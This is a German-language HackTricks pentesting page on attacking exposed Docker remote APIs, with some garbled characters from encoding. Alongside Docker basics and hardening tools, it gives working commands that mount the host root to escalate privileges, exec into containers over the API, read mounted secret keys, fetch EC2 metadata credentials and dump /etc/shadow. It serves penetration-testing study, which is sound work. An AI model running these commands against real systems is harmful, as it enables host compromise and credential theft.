<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>

## Docker-Grundlagen

### Was ist

Docker ist die **f√ºhrende Plattform** in der **Containerisierungsbranche**, die **kontinuierliche Innovation** vorantreibt. Es erleichtert die m√ºhelose Erstellung und Verteilung von Anwendungen, die von **traditionell bis futuristisch** reichen, und gew√§hrleistet ihre **sichere Bereitstellung** in verschiedenen Umgebungen.

### Grundlegende Docker-Architektur

- **[containerd](http://containerd.io)**: Dies ist eine **Kern-Laufzeitumgebung** f√ºr Container, die f√ºr das umfassende **Management des Lebenszyklus eines Containers** zust√§ndig ist. Dies umfasst die Handhabung von **Bild√ºbertragung und -speicherung** sowie die √úberwachung und Vernetzung von Containern. **Detailliertere Einblicke** in containerd werden **weiter erforscht**.
- Die **Container-Shim** spielt eine wichtige Rolle als **Vermittler** bei der Handhabung von **kopflosen Containern**, indem sie nahtlos von **runc** √ºbernimmt, nachdem die Container initialisiert wurden.
- **[runc](http://runc.io)**: Bekannt f√ºr seine **leichte und universelle Container-Laufzeitumgebung**, ist runc mit dem **OCI-Standard** ausgerichtet. Es wird von containerd verwendet, um Container gem√§√ü den **OCI-Richtlinien zu starten und zu verwalten**, und hat sich aus dem urspr√ºnglichen **libcontainer** entwickelt.
- **[grpc](http://www.grpc.io)** ist f√ºr die **Kommunikation** zwischen containerd und dem **Docker-Engine** unerl√§sslich und gew√§hrleistet eine **effiziente Interaktion**.
- Die **[OCI](https://www.opencontainers.org)** ist entscheidend f√ºr die Einhaltung der **OCI-Spezifikationen** f√ºr Laufzeitumgebung und Bilder, wobei die neuesten Docker-Versionen sowohl den OCI-Bild- als auch den Laufzeitstandard erf√ºllen.

### Grundlegende Befehle
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

**Containerd** wurde speziell f√ºr die Bed√ºrfnisse von Containerplattformen wie **Docker und Kubernetes** entwickelt. Es zielt darauf ab, die Ausf√ºhrung von Containern auf verschiedenen Betriebssystemen wie Linux, Windows, Solaris und anderen zu **vereinfachen**, indem es betriebssystemspezifische Funktionen und Systemaufrufe abstrahiert. Das Ziel von Containerd besteht darin, nur die f√ºr seine Benutzer erforderlichen wesentlichen Funktionen einzuschlie√üen und unn√∂tige Komponenten zu vermeiden. Es wird jedoch anerkannt, dass es eine Herausforderung ist, dieses Ziel vollst√§ndig zu erreichen.

Eine wichtige Designentscheidung besteht darin, dass **Containerd das Netzwerk nicht verwaltet**. Networking wird als kritischer Bestandteil von verteilten Systemen betrachtet, mit Komplexit√§ten wie Software Defined Networking (SDN) und Service Discovery, die von einer Plattform zur anderen erheblich variieren. Daher √ºberl√§sst Containerd die Netzwerkaspekte den von ihm unterst√ºtzten Plattformen.

W√§hrend **Docker Containerd verwendet**, um Container auszuf√ºhren, ist es wichtig zu beachten, dass Containerd nur einen Teil der Funktionalit√§ten von Docker unterst√ºtzt. Insbesondere fehlen Containerd die Netzwerkverwaltungsfunktionen, die in Docker vorhanden sind, und es unterst√ºtzt nicht die direkte Erstellung von Docker Swarms. Diese Unterscheidung verdeutlicht die fokussierte Rolle von Containerd als Container-Laufzeitumgebung, die spezialisiertere Funktionen an die integrierten Plattformen delegiert.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**Podman** ist ein Open-Source-Container-Engine, die den [Open Container Initiative (OCI) Standards](https://github.com/opencontainers) entspricht und von Red Hat entwickelt und gepflegt wird. Es unterscheidet sich von Docker durch mehrere einzigartige Funktionen, insbesondere seine **daemonlose Architektur** und die Unterst√ºtzung f√ºr **rootlose Container**, die es Benutzern erm√∂glichen, Container ohne Root-Rechte auszuf√ºhren.

Podman wurde entwickelt, um mit der Docker-API kompatibel zu sein und erm√∂glicht die Verwendung von Docker CLI-Befehlen. Diese Kompatibilit√§t erstreckt sich auch auf das √ñkosystem von Podman, zu dem Tools wie **Buildah** zum Erstellen von Container-Images und **Skopeo** f√ºr Bildoperationen wie Push, Pull und Inspektion geh√∂ren. Weitere Details zu diesen Tools finden Sie auf ihrer [GitHub-Seite](https://github.com/containers/buildah/tree/master/docs/containertools).

**Hauptunterschiede**

- **Architektur**: Im Gegensatz zum Client-Server-Modell von Docker ohne Hintergrunddienst arbeitet Podman ohne einen Daemon. Diese Gestaltung bedeutet, dass Container mit den Berechtigungen des Benutzers ausgef√ºhrt werden, der sie startet, was die Sicherheit erh√∂ht, indem der Root-Zugriff eliminiert wird.

- **Systemd-Integration**: Podman integriert sich mit **systemd**, um Container zu verwalten und erm√∂glicht die Container-Verwaltung √ºber systemd-Einheiten. Dies steht im Gegensatz zur Verwendung von systemd durch Docker, das haupts√§chlich f√ºr die Verwaltung des Docker-Daemon-Prozesses verwendet wird.

- **Rootlose Container**: Eine entscheidende Funktion von Podman ist die M√∂glichkeit, Container unter den Berechtigungen des initiierenden Benutzers auszuf√ºhren. Dieser Ansatz minimiert die Risiken im Zusammenhang mit Container-Verletzungen, indem sichergestellt wird, dass Angreifer nur die Berechtigungen des kompromittierten Benutzers erhalten und keinen Root-Zugriff.

Podmans Ansatz bietet eine sichere und flexible Alternative zu Docker und legt den Schwerpunkt auf die Verwaltung von Benutzerberechtigungen und die Kompatibilit√§t mit bestehenden Docker-Workflows.

{% hint style="info" %}
Beachten Sie, dass Podman das gleiche API wie Docker unterst√ºtzt, sodass Sie dieselben Befehle mit Podman verwenden k√∂nnen wie mit Docker, z. B.:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## Grundlegende Informationen

Die Remote-API wird standardm√§√üig auf Port 2375 ausgef√ºhrt, wenn sie aktiviert ist. Der Dienst erfordert standardm√§√üig keine Authentifizierung, was einem Angreifer erm√∂glicht, einen privilegierten Docker-Container zu starten. Durch die Verwendung der Remote-API kann man Hosts / (Stammverzeichnis) an den Container anh√§ngen und Dateien der Umgebung des Hosts lesen/schreiben.

**Standardport:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## Enumeration

### Manuell

Beachten Sie, dass Sie zur Aufz√§hlung der Docker-API den `docker`-Befehl oder `curl` verwenden k√∂nnen, wie im folgenden Beispiel:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Wenn Sie **die Remote Docker API mit dem `docker`-Befehl kontaktieren k√∂nnen**, k√∂nnen Sie **beliebige** der zuvor kommentierten **Docker-Befehle** [**ausf√ºhren**](2375-pentesting-docker.md#basic-commands), um mit dem Dienst zu interagieren.

{% hint style="info" %}
Sie k√∂nnen `export DOCKER_HOST="tcp://localhost:2375"` verwenden und die Verwendung des `-H`-Parameters mit dem Docker-Befehl **vermeiden**.
{% endhint %}

#### Schneller Privilegien-Eskalation
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

Manchmal sehen Sie **2376** f√ºr den **TLS**-Endpunkt. Ich konnte mich nicht mit dem Docker-Client verbinden, aber es ist m√∂glich, es mit curl zu tun.
```bash
#List containers
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s ‚Äìinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it‚Äôs also worth checking out services in case they are adding secrets via environment variables)
curl -s ‚Äìinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Wenn Sie weitere Informationen dazu w√ºnschen, finden Sie weitere Informationen, von wo ich die Befehle kopiert habe: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### Automatisch
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Kompromittierung

Auf der folgenden Seite finden Sie M√∂glichkeiten, **aus einem Docker-Container auszubrechen**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Durch Missbrauch dieser Methode ist es m√∂glich, aus einem Container auszubrechen. Sie k√∂nnten einen schwachen Container auf der entfernten Maschine ausf√ºhren, daraus ausbrechen und die Maschine kompromittieren:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Privilege Escalation

Wenn Sie sich auf einem Host befinden, der Docker verwendet, k√∂nnen Sie [**diese Informationen lesen, um zu versuchen, Privilegien zu erh√∂hen**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## Entdeckung von Geheimnissen in laufenden Docker-Containern
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
√úberpr√ºfen Sie **env** (Abschnitt Umgebungsvariablen) nach Geheimnissen und Sie k√∂nnten Folgendes finden:

* Passw√∂rter.
* IP-Adressen.
* Ports.
* Pfade.
* Andere... .

Wenn Sie eine Datei extrahieren m√∂chten:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## Sichern Sie Ihre Docker

### Sichern der Docker-Installation und -Verwendung

* Sie k√∂nnen das Tool [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) verwenden, um Ihre aktuelle Docker-Installation zu √ºberpr√ºfen.
* `./docker-bench-security.sh`
* Sie k√∂nnen das Tool [https://github.com/kost/dockscan](https://github.com/kost/dockscan) verwenden, um Ihre aktuelle Docker-Installation zu √ºberpr√ºfen.
* `dockscan -v unix:///var/run/docker.sock`
* Sie k√∂nnen das Tool [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) verwenden, um die Berechtigungen eines Containers zu √ºberpr√ºfen, wenn er mit verschiedenen Sicherheitsoptionen ausgef√ºhrt wird. Dies ist n√ºtzlich, um die Auswirkungen der Verwendung bestimmter Sicherheitsoptionen zum Ausf√ºhren eines Containers zu kennen:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Sichern von Docker-Images

* Sie k√∂nnen ein Docker-Image von [https://github.com/quay/clair](https://github.com/quay/clair) verwenden, um Ihre anderen Docker-Images zu scannen und Schwachstellen zu finden.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Sichern von Dockerfiles

* Sie k√∂nnen das Tool [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) verwenden, um **Ihr Dockerfile zu √ºberpr√ºfen** und alle Arten von Fehlkonfigurationen zu finden. Jede Fehlkonfiguration wird eine ID zugewiesen, hier finden Sie [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md), wie Sie jede einzelne beheben k√∂nnen.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* Sie k√∂nnen das Tool [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) verwenden, um **Ihr Dockerfile zu √ºberpr√ºfen** und alle Arten von Fehlkonfigurationen zu finden.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* Sie k√∂nnen das Tool [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) verwenden, um **Ihr Dockerfile zu √ºberpr√ºfen** und alle Arten von Fehlkonfigurationen zu finden.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* Sie k√∂nnen das Tool [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) verwenden, um **Ihr Dockerfile zu √ºberpr√ºfen** und alle Arten von Fehlkonfigurationen zu finden.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### Protokollierung verd√§chtiger Aktivit√§ten

* Sie k√∂nnen das Tool [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) verwenden, um **verd√§chtiges Verhalten in laufenden Containern** zu erkennen.
* Beachten Sie in dem folgenden Abschnitt, wie **Falco ein Kernelmodul kompiliert und einf√ºgt**. Danach l√§dt es die Regeln und **beginnt mit der Protokollierung verd√§chtiger Aktivit√§ten**. In diesem Fall hat es 2 privilegierte Container gestartet, von denen einer ein sensibles Mount hatte, und nach einigen Sekunden hat es erkannt, wie eine Shell in einem der Container ge√∂ffnet wurde.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### √úberwachung von Docker

Sie k√∂nnen auditd verwenden, um Docker zu √ºberwachen.

## Referenzen
* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
